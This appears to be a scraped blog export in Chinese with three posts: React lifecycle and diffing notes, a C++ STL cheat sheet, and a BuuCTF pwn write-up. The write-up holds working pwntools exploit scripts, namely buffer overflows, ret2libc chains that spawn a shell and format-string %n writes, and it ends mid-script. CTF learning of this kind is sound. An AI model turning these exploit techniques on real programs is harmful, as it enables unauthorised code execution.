1.&lt;h2&gt;内容规律变浅，消失后出现 2.点击&lt;button&gt;，组件消失 如何卸载一个组件？ 实现需求 如果将定时器设置在render里，定时器会发生嵌套，变化速度越来越快，占用越来越多，我们先折中一下，再布置一个按钮，将需求先完成 那么React是否有办法，在内容挂载到页面后，帮助我们调用一次定时器呢？ render的兄弟 — componentDidMount 我们知道，render调用的时机有两个： （1）初始化渲染 （2）状态更新之后 而componentDidMount则只在一个时候调用：组件挂载完毕 因此我们可以这样写 但是，这样仍存在一些错误，当我们点击&lt;button&gt;，&lt;h2&gt;确实木大了，但是控制台提出了抗议 组件没了，不能再更新状态了！所以我们还需要清空定时器 可以这样 但还可以这样 我们从这里可以看出，React总是提前准备了一些函数，再合适的时候做着合适的事情，而这些事情，如下图所示 这些函数被叫做： 生命周期回调函数 &lt;=&gt; 生命周期钩子函数 &lt;=&gt; 生命周期函数 &lt;=&gt; 生命周期钩子 而函数也不仅仅只有这两个，我们将在下面几小节讨论 生命周期（旧）理解： 1、组件从创建到死亡会经历一些特殊的阶段 2、React组件包含一系列钩子函数（生命周期回调函数），会在特定时刻调用 3、我们在定义组件时，会在特定的生命周期回调函数中，做特定的工作 生命周期流程图（旧） .png) 这里以求和为案例 挂载时： 更新时 我们添加 可以发现，页面开始并没有打印，而当我们按下\\更新之后 打印执行，这就是更新的含义 而在更新时，有三条路可以走 线路2 setState已经很熟悉了，pass shouldComponentUpdate 其中的shouldComponentUpdate（是否更新），类似于一个阀门，返回true，代表更新可以进行，而返回false，代表更新不被允许（默认返回true） 我们添加这个钩子（返回true），再点击 + 1 正如上面所说，每次更新之前都询问了“阀门状态” componentWillUpdate 添加钩子，点击 +1 之后的控制台 componentDidUpdate 添加钩子，点击 +1 之后的控制台 线路3 forceUpdate（强制更新） 不对状态做出更改（不管阀门），强制更新组件 我们把阀门设为false，尝试一下 果然绕过了阀门 线路1 我们要先在两个组件之间构建父子关系 我们想通过A组件，展示B组件的信息 componentWillReceiveProps 由于是B组件从外部（A）接收标签，我们添加钩子查看 点开之后，没有？？？！！！ 实际上，这个钩子有个“坑“，第一次传的不算 我们点击按钮（由于挂载页面时已经render一回了，这次便是第二次执行，B组件也接收到了新的props）， 点之前 点之后 总结：旧生命周期1. 初始化阶段: 由ReactDOM.render()触发—-初次渲染 \\1. constructor() \\2. componentWillMount() \\3. render() ===&gt; 必须 \\4. componentDidMount() ===&gt; 常用 ​ 用于初始化，如：开启定时器、发送网络请求、订阅消息 2. 更新阶段: 由组件内部this.setSate()或父组件重新render触发 \\1. shouldComponentUpdate() \\2. componentWillUpdate() \\3. render() ===&gt; 必须 \\4. componentDidUpdate() 3. 卸载组件: 由ReactDOM.unmountComponentAtNode()触发 \\1. componentWillUnmount() ===&gt; 常用 ​ 用于”收尾“，如：关闭定时器、取消订阅消息 新旧生命周期对比我们将上面求和的例子中的引入的React换为新版本，发现代码可以正常挂载，but 这些警告说明了旧钩子在新版本中也可以用，但不被推荐使用，同时两个函数名称发生改变 更改之后，下面的两个警告disappear了 简记：所有带”will“的钩子（3个），在新版本都推荐前置UNSAFE_（无关安全性，是警告可能在未来版本中出现bug），除了 componentWillUnmount 官方文档中提出，那3个需要加前缀的钩子，都即将过时！！！ 我们在下面重新展示新旧的生命周期图，进行对比 .png) .png) 首先，带有will的几个”_UNSAFE“钩子没有再新周期图中出现 其次，新周期图多了getDerivedStateFromProps（挂载时）、getSnapshotBeforeUpdate（更新时）这两个新钩子 生命周期（新）这里先说一下新生命周期的几个钩子 getDerivedStateFromProps（从props得到派生的状态）我们将其添加进组件 意想不到的事情发生了 警告告诉我们，这个钩子挂到了实例上，请定义它，把它作为一个静态方法 加上 static之后 返回又不对了，它要求只能返回一个状态对象，或者是null 我们先返回一个null 流程按照流程图正常显示了 但当我们返回一个状态对象 1return &#123;count: 108&#125; 我们发现显示的值不变了，+ 1 按钮也失灵了 实际上，这个钩子就收到的参数，是props 1static getDerivedStateFromProps(props) 此方法适用于罕见的用例，即state的值在任何时刻都取决于props 需要注意的是，派生状态会导致代码冗杂，导致组件难以维护 getSnapshotBeforeUpdate（更新之前获取快照） 123getSnapshotBeforeUpdate() &#123; console.log(&#x27;getSnapshotBeforeUpdate&#x27;)&#125; 要求我们返回null或者快照，null的话更上一个相似，都pass了 案例 当我们想实现滚动条增长，同时停在某一行时，我们可以用快照保存之前的长度，并使用componentDidUpdate(preProps, preState, height)接受快照，令当前的scrollTop += scrollHeight - 传入的长度，实现停留 总结：新生命周期1. 初始化阶段: 由ReactDOM.render()触发—-初次渲染 \\1. constructor() 2. getDerivedStateFromProps \\3. render() \\4. componentDidMount() 2. 更新阶段: 由组件内部this.setSate()或父组件重新render触发 1. getDerivedStateFromProps \\2. shouldComponentUpdate() \\3. render() 4. getSnapshotBeforeUpdate \\5. componentDidUpdate() 3. 卸载组件: 由ReactDOM.unmountComponentAtNode()触发 \\1. componentWillUnmount() DOM的diffing算法 与 keyDOM的diffing算法 &amp;&amp; key当状态中的数据发生变化时，react会根据【新数据】生成【新的虚拟DOM】, 随后React进行【新虚拟DOM】与 【旧虚拟DOM】的diff比较，规则如下： key是虚拟DOM对象的标识, 在更新显示时key起着极其重要的作用 a. 旧虚拟DOM中找到了与新虚拟DOM相同的key： (1).若虚拟DOM中内容没变, 直接使用之前的真实DOM (2).若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM b. 旧虚拟DOM中未找到与新虚拟DOM相同的key 根据数据创建新的真实DOM，随后渲染到到页面 我们以下面的题目为例 需求如图所示 由于两者用的key不同，导致其效率有着较大差异，且会发生问题 可以发现，上面的发生了数据偏移，这是个严重错误 通过上面两幅图进行对比， 首先是效率问题，我们发现，由于p1是用index（索引值）作为key，当新元素放到首位时，全体元素的所引发生变化，导致所有元素都重新加载了一遍，而p2则只需加载一遍 其次是数据问题，由于diffing是分层比较的，因此在p1中，“更新小王”和“初始小张”比较，发现外层不同后，仍然进入内层比较，并认为type相同，因此保留下来了“初始小张”的框，而到最后，React发现没有索引值为2的元素，所以把”小李“和一个没输入的框挂了上去；而p2使用id比较，各个标签都能找到对应的元素 我们进行总结： （1）用index作为key可能会引发的问题： 若对数据进行：逆序添加、逆序删除等破坏顺序操作: DOM更新 ==&gt; 界面效果没问题, 但效率低。 如果结构中还包含输入类的DOM会产生错误DOM更新 ==&gt; 界面有问题。 注意！如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的 （2）开发中如何选择key? 最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。 如果确定只是简单的展示数据，用index也是可以的。","categories":[],"tags":[{"name":"React","slug":"React","permalink":"https://0410wzn.top/tags/React/"}]},{"title":"C++STL总结","slug":"C++STL总结","date":"2022-01-18T11:54:20.000Z","updated":"2022-01-18T12:01:17.659Z","comments":true,"path":"2022/01/18/C++STL总结/","link":"","permalink":"https://0410wzn.top/2022/01/18/C++STL%E6%80%BB%E7%BB%93/","excerpt":"","text":"C++STL总结 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143vector（变长数组），倍增的思想，支持比较运算（按字典序） 定义：： vector &lt;int&gt; a; 定义：一个vector数组a vector &lt;int&gt; a(10); 定义：一个长度为10的vector数组a vector &lt;int&gt; a(10,3); 定义：一个长度为10的vector数组a，并且所有元素都为3 常用函数：： size(); 返回元素个数 empty(); 返回是否是空 clear(); 清空 front(); 返回vector的第一个数 back(); 返回vector的最后一个数 push_back(); 向vector的最后插入一个数 pop_back(); 把vector的最后一个数删掉 begin(); vector的第0个数 end(); vector的最后一个的数的后面一个数 倍增的思想： 系统为某一程序分配空间是，所需时间，与空间大小无关，与申请次数有关 遍历方法 假设有个vector &lt;int&gt; a; 第一种： for(int i = 0;i &lt; a.size();i ++) cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;; 第二种： for(vector &lt;int&gt;::iterator i = a.begin();i != a.end();i ++) cout&lt;&lt;*i&lt;&lt;&quot; &quot;; vector &lt;int&gt;::iterator可以写为auto 第三种： for(auto x : a) cout&lt;&lt;x&lt;&lt;&quot; &quot;;pair，支持比较运算，以first为第一关键字，以second为第二关键字（按字典序） 定义：： pair &lt;类型,类型&gt; 变量名; 两个类型可以不同 初始化方式： 假设有个pair &lt;int,string&gt; p; 第一种： p = make_pair(10,&quot;abc&quot;); 第二种： p = &#123;10,&quot;abc&quot;); 常用函数：： first; 第一个元素 second; 第二个元素string（字符串） 常用函数：： substr(); 返回每一个子串 c_str(); 返回这个string对应的字符数组的头指针 size(); 返回字母个数 length(); 返回字母个数 empty(); 返回字符串是否为空 clear(); 把字符串清空queue（队列） 定义：： queue &lt;类型&gt; 变量名; 常用函数：： size(); 这个队列的长度 empty(); 返回这个队列是否为空 push(); 往队尾插入一个元素 front(); 返回队头元素 back(); 返回队尾元素 pop(); 把队头弹出 注意：队列没有clear函数！！！ 清空： 变量名 = queue &lt;int&gt; ();priority_queue（优先队列，堆） 注意：默认是大根堆！！！ 定义：： 大根堆：priority_queue &lt;类型&gt; 变量名; 小根堆：priority_queue &lt;类型,vecotr &lt;类型&gt;,greater &lt;类型&gt;&gt; 变量名 常用函数： size(); 这个堆的长度 empty(); 返回这个堆是否为空 push();往堆里插入一个元素 top(); 返回堆顶元素 pop(); 弹出堆顶元素 注意：堆没有clear函数！！！stack（栈） 常用函数： size(); 这个栈的长度 empty(); 返回这个栈是否为空 push(); 向栈顶插入一个元素 top(); 返回栈顶元素 pop(); 弹出栈顶元素deque（双端队列） 常用函数： size(); 这个双端队列的长度 empty(); 返回这个双端队列是否为空 clear(); 清空这个双端队列 front(); 返回第一个元素 back(); 返回最后一个元素 push_back(); 向最后插入一个元素 pop_back(); 弹出最后一个元素 push_front(); 向队首插入一个元素 pop_front(); 弹出第一个元素 begin(); 双端队列的第0个数 end(); 双端队列的最后一个的数的后面一个数set，map，multiset，multimap 基于平衡二叉树（红黑树），动态维护有序序列 set/multiset 注意：set不允许元素重复，如果有重复就会被忽略，但multiset允许！！！ 常用函数： size(); 返回元素个数 empty(); 返回set是否是空的 clear(); 清空 begin(); 第0个数，支持++或--，返回前驱和后继 end(); 最后一个的数的后面一个数，支持++或--，返回前驱和后继 insert(); 插入一个数 find(); 查找一个数 count(); 返回某一个数的个数 erase(); （1）输入是一个数x，删除所有x O(k + log n) （2）输入一个迭代器，删除这个迭代器 lower_bound(x); 返回大于等于x的最小的数的迭代器 upper_bound(x); 返回大于x的最小的数的迭代器 map/multimap 常用函数： insert(); 插入一个数，插入的数是一个pair erase(); （1）输入是pair （2）输入一个迭代器，删除这个迭代器 find(); 查找一个数 lower_bound(x); 返回大于等于x的最小的数的迭代器 upper_bound(x); 返回大于x的最小的数的迭代器unordered_set，unordered_map，unordered_muliset,unordered_multimap 基于哈希表 和上面类似，增删改查的时间复杂度是O(1) 不支持lower_bound()和upper_bound()bitset 压位 定义： bitset &lt;个数&gt; 变量名; 支持： ~，&amp;，|，^ &gt;&gt;，&lt;&lt; ==，!= [] 常用函数： count(); 返回某一个数的个数 any(); 判断是否至少有一个1 none(); 判断是否全为0 set(); 把所有位置赋值为1 set(k,v); 将第k位变成v reset(); 把所有位变成0 flip(); 把所有位取反，等价于~ flip(k); 把第k位取反","categories":[],"tags":[{"name":"STL","slug":"STL","permalink":"https://0410wzn.top/tags/STL/"}]},{"title":"BuuCTF Pwn WP","slug":"BuuCTF-Pwn-WP","date":"2022-01-06T13:54:07.000Z","updated":"2022-04-25T13:21:17.858Z","comments":true,"path":"2022/01/06/BuuCTF-Pwn-WP/","link":"","permalink":"https://0410wzn.top/2022/01/06/BuuCTF-Pwn-WP/","excerpt":"","text":"BuuCTF Pwn WPWP作者：WZN 题目地址： https://buuoj.cn/challenges rip知识点：栈溢出 re2text 先看一下文件进制和保护措施 很好，什么都没开，我们使用64位的ida分析一下文件 主函数如图 gets()函数存在明显风险，双击s，发现占15个字符 查看函数，发现已有后门函数fun 构造exp，因为pwn1为64位程序，所以要补充8字节填上esp，返回fun的地址 12345678910111213from pwn import *context.arch = &quot;amd64&quot;io = process(&quot;/home/kali/Desktop/pwn1&quot;)fun = 0x401186payload = b&#x27;a&#x27; * (15 + 8) + p64(fun)io.sendline(payload) io.interactive() 本脚本在本地打通了程序，但是当笔者打靶机(Unbuntu18)的时候，却怎么也打不通，为什么呢？ 栈对齐—— ubuntu libc 为 libc2.27，高版本的libc要求是返回地址必须是16字节对齐（也可以说，远程环境是 ubuntu18，64位的程序则需要考虑堆栈平衡的问题） 我们通过添加一个 ret 指令来使16字节对齐 ROPgadget —binary 文件名 —only “pop|ret” 找到ret地址，再次构造exp 1234567891011121314from pwn import *context.arch = &quot;amd64&quot;io = process(&quot;/home/kali/Desktop/pwn1&quot;)ret = 0x401016fun = 0x401186payload = b&#x27;a&#x27; * (15 + 8) + p64(ret) + p64(fun)io.sendline(payload) io.interactive() 打通了！！！ warmup_csaw_2016知识点：栈溢出 re2text 首先检查保护措施 什么都没开，我直呼好耶！ 接着ida分析一下，F5查看伪代码 可以很明显的的发现gets函数存在明显的栈溢出风险，同时我们注意到了sub_40060D函数 可以看到该段是具有可执行的权限，而0x0804A080正好在此区间 1CODE 其中明显有获取flag的指令，我们的思路很明确了，通过栈溢出，返回到system函数的地址即可 在这里给出两个获取偏移地址的方法： 获取偏移地址方法一 我们观察到gets函数读入的是v5，而v5偏移量为0x40，再加上64位ELF文件填充esp需要8字节，即72字节 方法二 使用gdb来获取 使用pattern create 200生成溢出字符，但注意，在生成时要保证其能覆盖到RIP 执行 r 或者 start 命令让程序运行。//注意 start 命令执行后，还需执行 contin 命令。 在 please input 命令后，将之前生成的溢出字符串粘贴上去。 （1）得到RBP寄存器中 ‘AAdAA3AA’ 。往该字符串后，随便复制一串，进行偏移量计算 执行 pattern offset xxxxxx 命令 （2）复制 stack 复制栈顶的字符串 前四个字节（==64 bits为前8个字节==） 计算偏移量 如上 构造exp即可 123456789101112from pwn import *io = remote(&#x27;node4.buuoj.cn&#x27;, 27092)addr = 0x40060Dpayload = b&#x27;a&#x27; * 72 + p64(addr)io.sendline(payload)i.interactive() ciscn_2019_n_1知识点：栈溢出 覆盖变量值 首先查看保护机制 跟上面几题不同，本题开启了栈不可执行(NX)，这就是说，上两题中通过直接栈溢出执行shellcode的思路不再适用，下面我们通过ida来分析，首先看主函数 主函数并没有什么明显的突破点，不过主函数中间还有个func()函数，让我们去看看它 可以发现，func()函数中存在着明显的漏洞，而且，函数中包括了查看flag的命令，通过观察函数我们知道，当v2的值为11.28125时会执行此命令，至此，我们的思路已经非常清晰了——通过v1进行栈溢出，改写v2的值，使cat flag的命令执行 观察栈 可知,v1所占的空间为0x30 - 0x04(0x2c)（这里还有第二种理解方法，通过本题的第一幅图我们知道，v2和esp距离为2c，所以直接填上0x2c），同时我们写要输入v2的值（16进制呦），构造如下wp 123456789101112from pwn import *context.arch = &quot;amd64&quot;io = process(&quot;/home/kali/Desktop/ciscn_2019_n_1&quot;)payload = b&#x27;a&#x27; * (0x30 - 0x04) + p64(0x41348000)io.sendline(payload) io.interactive() pwn1_sctf_2016知识点：栈溢出 re2text 第一步，查看保护措施 打开了栈不可执行，使用ida打开观察 主函数引我们去看vuln()函数 emmm，着实看不太懂，我们能知道的，就是fgets()函数有32字节的输入长度限制，还有明显的“I”和“you”，以及一个replace()替换函数，先去运行一下吧， 我们输入“I”、“you”和随便一个其它字符，可以明显地发现，只有当输入“I”的时候，程序输出的值发生了变化，每个“I”，都分别变成了“you”，所以上面的replace()函数作用应该就是把“I”和”you”替换 简单了解程序后，我们回到ida，继续观察程序，不难发现，在程序中，存在一个名为“get_flag”的函数 很明显，这个函数就是我们最后要返回的函数，地址为0x8048F0D 回到vuln()函数 我们可以知道，s字符串所占的字节长度为60字节（3 * 16 + 12 = 60），而fgets()函数规定了输入的长度最长为32，这表明我们通过直接输入字符是无法将s覆盖的，该怎么办呢？ 通过刚才对程序的分析，我们知道，程序会将“I”转换成“you”，这不就将1个字节转换为3个字节了吗！ 需要覆盖60个字节，就只输入20个“I“即可！（==别忘了32位程序ebp的4个字节==） 构造exp如下： 123456789from pwn import *io = process(&quot;/home/kali/Desktop/pwn1_sctf_2016&quot;)payload = b&#x27;I&#x27; * 20 + b&#x27;a&#x27; * 4 + p32(0x8048F0D)io.sendline(payload) io.interactive() jarvisoj_level0知识点：栈溢出 re2text 查看一下保护措施 hh，蛮好的，只开了NX 使用ida查看一下伪代码 main函数，pass 看一下vulnerable_function()函数 不出意外。栈溢出应该是这里发生的 在函数中，我们发现了callsystem函数，众所周知，这是个好函数名 果然如此 由上述分析过程我们可以知道，本题的思路是通过read进行栈溢出，最后返回callsystem的地址 构造exp如下 1234567891011from pwn import *context.arch = &quot;amd64&quot;io = process(&quot;/home/kali/Desktop/level0&quot;)payload = b&#x27;a&#x27; * (0x80 + 8) + p64(0x400596)io.sendline(payload) io.interactive() ciscn_2019_c_1知识点：栈溢出 ret2libc 首先检查保护措施 打开了栈不可执行 用ida查看函数的伪代码 主函数并没有什么明显的泄漏点，我们发现主函数引用了encrpty()函数，去看看这个函数 首先，这是个加密函数，不过由于其判定是否加密的条件在于strlen，我们可以通过输入\\0来规避这种加密对于payload的修改；其次，这个函数里有明显的溢出点gets()，而在发现溢出点之后，我们需要寻找函数内部是否有可用的函数段 很遗憾，这个程序里既没有system函数，也没有/bin/sh命令，于是想到这道题可能需要通过libc泄露来做 具体思路如下 1.先通过一次栈溢出，将puts的plt地址放到返回处，通过代码中的puts(输出)功能泄露出执行过的函数(puts)的got地址 2.将puts的返回地址设置为_start函数（我们在ida中看到的main()函数是用户代码的入口，是对于用户而言），而start函数是系统代码入口，是程序最初被执行的地方，也就是程序真正的入口），以用来执行system(‘/bin/sh’) 3.通过泄露出的got地址计算出libc中的system和/bin/sh的地址（system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。） 4.再次执行栈溢出，把返回地址换成system的地址达到getshell 有思路之后，我们回到函数进行分析 由上述思路可知，本题需要两次传入payload进行栈溢出 第一次溢出： 观察函数可知，如果v0 &gt;= strlen(s),就会对我们输入的payload进行一系列”操作“，为了避免这种状况，我们可以利用strlen()函数读到’\\0’停止的特性，先向其中传入’\\0’ 观察s 我们需要向其中输入的垃圾字节为0x50 + 0x08 - 1 64位程序中，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。 puts只有一个参数，就找rdi就行 通过ROPgadget，我们找到了rdi的返回地址0x400c83 之后就是输入puts的got地址和plt地址，并返回主函数准备下一次溢出 第二次溢出： 大致前几步与第一次一样，最后通过LibcSearcher找到/bin/sh和system的地址，需要注意的是，由于是ubuntu，环境要求栈平衡，所以需要ret来使栈平衡 总结思路： First &#39;\\0&#39;绕过strlen() &#39;\\0&#39;和(0x50 + 0x08 - 1)一起覆盖s，并进行栈溢出（”-1“是因为’\\0’占了1字节） p64(pop_rdi) p64(puts_got) 设置rdi寄存器的值为 puts 的 got 表地址 p64(puts_plt) 调用puts函数，输出的是 puts 的 got 表地址 p64(main_addr) 设置返回地址，上述步骤完成了输出了puts函数的地址，我们得控制程序执行流 ​ 让它返回到main函数，这样我们才可以再一次利用输入点构造rop Second &#39;\\0&#39;绕过strlen() &#39;\\0&#39;和(0x50 + 0x08 - 1)一起覆盖s，并进行栈溢出 为保持栈平衡，输入p64(ret) p64(pop_rdi) p64(binsh) p64(sys_addr) 最后很奇怪的，试了多次之后本地都没有打通，反而在使用LibcSearcher之后线上打通了，下面把两个wp放在下面，希望发现错误的师傅在下面留言，救救孩子🥰 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *from LibcSearcher import *context(log_level = &#x27;debug&#x27;)io = remote(&quot;node4.buuoj.cn&quot;,25334)io = process(&#x27;/home/w/桌面/ciscn_2019_c_1&#x27; )elf = ELF(&#x27;/home/w/桌面/ciscn_2019_c_1&#x27; )libc = ELF(&#x27;/home/w/桌面/libc-2.27.so&#x27; )pop_rdi = 0x0000000000400c83puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]main_addr = 0x0000000000400B28payload1 = b&#x27;\\0&#x27; + b&#x27;a&#x27; * (0x50 + 0x8 - 1) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)io.sendline(&#x27;1&#x27;)io.sendlineafter(&#x27;encrypted\\n&#x27;, payload1)io.recvuntil(&#x27;Ciphertext\\n&#x27;)io.recvuntil(&#x27;\\n&#x27;)puts_addr = u64(io.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))#recvuntil(&#x27;\\x7f&#x27;)[-6:],意思是接收到 \\x7f，然后把从这往前6字节长度取出来#j#ljust(8, &#x27;\\x00&#x27;)，补齐8个字节#目的是使用u64解小端序恢复正常顺序print(hex(puts_addr))ret =0x00000000004006b9&quot;&quot;&quot;libc_base = puts_addr - libc.symbols[&#x27;puts&#x27;]sys_addr = libc_base + libc.symbols[&#x27;system&#x27;]binsh_addr = libc_base + libc.symbols[&quot;/bin/sh&quot;].next()&quot;&quot;&quot;libc = LibcSearcher(&quot;puts&quot;,puts_addr)libc_base = puts_addr - libc.dump(&quot;puts&quot;)sys_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)io.sendlineafter(&#x27;choice!\\n&#x27;, &#x27;1&#x27;)payload2 = b&#x27;\\0&#x27; + b&#x27;a&#x27; * (0x50 + 0x8 - 1) + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(sys_addr)io.sendlineafter(&#x27;encrypted\\n&#x27;, payload2) io.interactive() 补充相关知识（一） 32位系统，libc的函数地址是\\xf7开头，长度4字节。 64位系统，libc的函数地址是\\x7f开头，长度6字节。 （二） 函数调用方式的介绍 32位程序：先将参数压入栈中，靠近call的是第一个参数；运行执行指令的时候直接去内存地址寻址执行 64位程序：通过寄存器来传址（这就是本题需要rdi的地址），寄存器去内存寻址，找到地址返回给程序 ​ 以下是64位程序调用 （三） plt &amp;&amp; got ELF 文件中通常存在.GOT.PLT 和.PLT 这两个特殊的节，ELF 编译时无法知道libc 等动态链接库的加载地址。如果一个程序想调用动态链接库中的函数，就必须使用.GOT.PLT和.PLT 配合完成调用。 如在上图中，call _printf 并不是跳转到了实际 _printf 函数的位置。因为在编译时程序并不能确定printf 函数的地址，所以这个call 指令实际上通过相对跳转，跳转到了 FLT 表中的printt 项。下图中就是 PLT对应 printt 的项。ELF 中所有用到的外部动态链接库函数都会有对应的 PLT 项目。PLT 表还是一段代码，作用是从内存甲取出一个地址然后跳转。取出的地址便是_ printf的实际地址，而存放这个_printf 函数实际地址的地方就是最后一张图中的 GOT.PLT 表。 可以发现，.GOT.PLT 表其实是一个函数指针数组，数组中保存着 ELF 中所有用到的外部函数的地址。GOT.PLT 表的初始化工作则由操作系统来完成。 而由于 Linux 非常特殊的 Lazy Binding 机制。在没有开启 Full Rello 的 ELF中，GOT.PLT 表的初始化是在第一次调用该函数的过程中完成的。也就是说，某个函数必须被调用过， GOT.PLT 表中才会存放函数的真实地址。 GOT.PLT 和.PLT对于 PWN 来说有什么作用： PLT 可以直接调用某个外部函数 .GOT.PLT 中通常会存放libc中函数的地址，在漏洞利用中可以通过读取.GOT.PLT 来获得 libc 的地址，或者通过写.GOT.PIT 来控制程序的执行流。 [第五空间2019第五主题]PWN5知识点：格式化字符串 老规矩，先查看保护措施，可以看见，本题打开了NX和Canary保护 使用ida观察伪代码，发现Canary和NX都开了，也就是说，上面的大部分思路都不适用于本题，而此时我们也可以去考虑格式化字符串漏洞 我们可以很明显的发现两个点，一，当atoi(nptr) = dword_804C044时，会调用system函数，而通过上部分的伪代码，我们可以得知由于Canary保护的开启，dword_804C044为一个随机的值；二，由于printf(buf)并未做出输出的限制，存在着明显的风险 至此，我们的思路基本就确定了： 通过printf判断参数在栈上的位置 %n修改参数内容，改变数据 在进入if判断时输入我们覆盖随机数对应的数据，进而达到绕过Canary的效果 我们先找到read的地址，即0x0804928D，接下来，就要计算偏移量了，明确参数在栈上的位置 这里提供几种方法： 参数在栈上的位置第一种，火眼金睛 这里再查看栈 数出来就是10!!! 第二种， AAAA对应的十六进制是41414141，可以看到我们输入的参数是在栈上的第10个位置 第三种 在确定好偏移值后，我们查看随机数的字节数——是4字节 因此，我们可以在输入地址后，分别用%(10 - 13)$hhn去修改bss数据段里的内容，构造payload 1234567891011121314from pwn import *io = process(&#x27;/home/w/桌面/pwn&#x27; )addr = 0x0804C044;payload = p32(addr) + p32(addr + 1) + p32(addr + 2) + p32(addr + 3) + b&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;io.sendline(payload)io.sendline(str(0x10101010))#每个字节都改成了0x10，所以这个数字就是0x10101010io.interactive() or 12345678910111213from pwn import *io = process(&#x27;/home/w/桌面/pwn&#x27; )addr = 0x0804C044;payload = p32(addr) + b&#x27;%10$n&#x27;io.sendline(payload)io.sendline(&#x27;4&#x27;)io.interactive() ciscn_2019_n_8查看保护措施 太可怕了，保护全开！！！ 我们观察伪代码 运行 可以发先，本题的思路，意外的简单——让var数值的第14个值等于17，就可以执行system函数，而var在bss段，单位大小为dd即4字节，var[13]即13*4，_QWORD为8字节，构造payload即可 12345678910from pwn import *io = process(&#x27;/home/w/桌面/ciscn_2019_n_8&#x27;)payload = b&#x27;a&#x27; * 13 * 4 + p32(17)#payload = p32(17) * 14 (都给17w)io.sendline(payload)io.interactive() jarvisoj_level2查看保护措施 ida查看伪代码 进函数堪堪 这里有明显的可利用函数 查看buf所占空间 在函数中并没有/bin/sh，不过有不少system函数，shift + 12，发现有/bin/sh，思路至此敲定，从read入手，返回system与/bin/sh即可 esp如下 1234567891011from pwn import *io = remote(&#x27;node4.buuoj.cn&#x27;, 27740)# system只能选取已经执行过的system !!!payload = b&#x27;a&#x27; * (136 + 4) + p32(0x0804845C) + p32(0x0804A024)io.sendline(payload)io.interactive() [OGeek2019]babyrop知识点：栈溢出 re2libc checksec一下 发现只开了NX和RELRO，接下来查看并分析ida伪代码 在参考众多WP之后，才看懂了代码的逻辑， 调用的 sub_80486BB() 函数里有一个alarm()闹钟，会阻碍调试，而主函数中的fd是一个文件句柄，打开了一个给定随机值的文件，截断成四字节的int赋值给buf传入sub_804871F() 这个函数内部也没有明显的点，sprintf()将参数 a1 转换成字符串 s，下一行读入字符串 buf，v6 为其长度，接着把buf最后的字符去掉了，v1为其新长度 溢出点应该在这个函数之内，通过控制参数a1尽可能的大（0xff就不错），触发read(0, buf, a1)的栈溢出，而想要向其输入较大的a1，通过分析函数，我们知道了，a1是上一个函数sub_804871F()的返回值，为了通过这个函数输入较大的a1，我们需要向buf中输入\\0来防止exit(0)执行退出，即我们需要在sub_804871F()中也需要通过read进行一次栈溢出 我们查看buf所占的大小 让 buf 的长度达到 8 就能覆盖掉 return 的变量 同时，我们查看程序中是否存在system()函数和’\\bin\\sh’ 很遗憾，没有 —— 不过没关系，题目给了我们对应的libc，我们可以通过执行程序获取write和system以及/bin/sh的偏差值，进而得出他们在程序中的地址，所以需要进行两次溢出，本题的类型，正是 —— ret2libc 我们构造payload的思路如下图所示 具体如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context(log_level = &#x27;debug&#x27;)io = process(&#x27;./pwn&#x27;)#io = remote(&#x27;node4.buuoj.cn&#x27;, 26902)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27; )write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]main = 0x08048825payload = b&#x27;\\0&#x27; + b&#x27;\\xff&#x27; * 7io.sendline(payload)io.recvuntil(&quot;Correct\\n&quot;)payload1 = b&#x27;a&#x27; * (0xE7 + 4) + p32(write_plt) + p32(main)payload1 += p32(1) + p32(write_got) + p32(4)io.sendline(payload1)write_addr = u32(io.recv(4))#u32就是把机器码转换w地址write_libc = libc.sym[&#x27;write&#x27;]sys_libc = libc.sym[&#x27;system&#x27;]binsh_libc = libc.search(b&#x27;/bin/sh&#x27;).__next__()base = write_addr - write_libcsys_addr = base + sys_libcbinsh_addr = base + binsh_libcpayload2 = b&#x27;\\0&#x27; + b&#x27;\\xff&#x27; * 7io.sendline(payload)io.recvuntil(&quot;Correct\\n&quot;)payload2 = b&#x27;a&#x27; * (0xE7 + 4) + p32(sys_addr) + p32(main) + p32(binsh_addr)io.sendline(payload2)io.interactive() get_started_3dsctf_2016先查看保护措施 好耶耶耶耶耶耶耶耶·！！！只开了NX！！！ （ida打开之后，整个人都，不好，了!） 那一堆函数震惊到我，那简单至极的main函数让我欣喜，那黑深残的gets函数更让我破防 当我们按下shift和F12时，有喜亦有忧 明显的flag和不存在的binsh 我们查看flag在哪里 在这之后，我认为只要让gets函数跳转到这个函数，再将a1与a2传入即可，而这种方法，在本地是切实可行的，而在远程是不行的！！！ 为什么？ 在查阅大佬们的WP之后，我明白了，由于我们跳转函数并输入值的手法是栈溢出，在执行完之后，程序便会崩溃，所以在本地我们可以接到它，而在远程，由于程序的崩溃，使得后续的交互 — interactive 无法正常执行，我们便无法得到返回的flag，因此，我们要在程序中执行exit函数，保证函数的正常退出，避免崩溃 注意的是，32位程序调用函数约定：函数 返回地址 参数1 参数2 参数3…，因此我们要先把exit()的地址填上，再填a1、a2 找到地址 贡上WP 123456789101112131415from pwn import *io = process(&#x27;/home/w/桌面/get_started_3dsctf_2016&#x27; 